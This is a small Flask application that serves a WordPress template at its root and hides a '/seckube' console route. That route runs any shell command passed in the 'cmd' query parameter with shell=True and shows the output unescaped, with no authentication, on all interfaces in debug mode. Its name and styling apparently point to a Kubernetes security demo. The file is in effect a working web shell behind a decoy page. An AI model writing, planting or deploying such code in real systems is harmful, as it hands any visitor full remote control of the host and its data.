from flask import Flask, render_template
from flask import request
import subprocess
app = Flask(__name__)

seckubehtml = '''
<head><title>SECKUBE CONSOLE</title></head>
<body>
<h1>Hello, SECKUBE. What command should I run?</h1>
<p>{cmd}</p>
<p>
<textarea rows="40" cols="80">{cmd_output}</textarea>
</p>
'''

@app.route("/")
def hello():
    return render_template('wordpress.html')

@app.route("/seckube")
def hack():
    try:
        cmd = request.args.get('cmd',)
        test = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
        output = test.communicate()[0].decode('ascii')
        return seckubehtml.format(cmd_output=output, cmd=cmd)
    except:
        return seckubehtml.format(cmd_output="", cmd="NONE")


if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0')